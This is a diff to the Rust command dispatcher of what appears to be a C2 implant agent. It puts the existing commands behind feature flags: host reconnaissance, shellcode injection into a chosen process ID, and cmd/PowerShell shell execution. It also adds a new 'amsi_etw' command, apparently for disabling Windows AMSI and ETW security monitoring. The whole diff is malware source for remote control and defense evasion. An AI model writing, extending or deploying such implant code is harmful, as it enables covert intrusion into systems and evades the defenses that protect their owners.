@@ -64,19 +64,24 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
     }
 
     match command {
-        "whoami" => format!("{}\\{}", hostname(), username()).into(),
-        "info" => collect_system_info().into(),
-        "ps" => list_processes_browser(),
-        "netstat" => list_network_connections().into(),
-        "integrity" => integrity_level().into(),
-        "inject" => {
+        "whoami" if cfg!(feature = "cmd-whoami") => {
+            format!("{}\\{}", hostname(), username()).into()
+        }
+        "info" if cfg!(feature = "cmd-info") => collect_system_info().into(),
+        "ps" if cfg!(feature = "cmd-ps") => list_processes_browser(),
+        "netstat" if cfg!(feature = "cmd-netstat") => list_network_connections().into(),
+        "integrity" if cfg!(feature = "cmd-integrity") => integrity_level().into(),
+        "inject" if cfg!(feature = "cmd-inject") => {
             let pid = link_common::extract_param(parameters, "pid");
             let sc = link_common::extract_param(parameters, "shellcode");
             inject_cmd(&format!("{} {}", pid, sc)).into()
         }
+        "amsi_etw" if cfg!(feature = "cmd-amsi-etw") => {
+            crate::amsi_etw::amsi_etw_cmd(parameters).into()
+        }
         // cmd and powershell are Windows-specific shell variants,
         // registered separately on the Go side (cmd.go, powershell.go).
-        "cmd" | "powershell" | "shell" => {
+        "cmd" | "powershell" | "shell" if cfg!(feature = "cmd-shell") => {
             let cmd = link_common::extract_param(parameters, "command");
             let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
             if command == "powershell" {
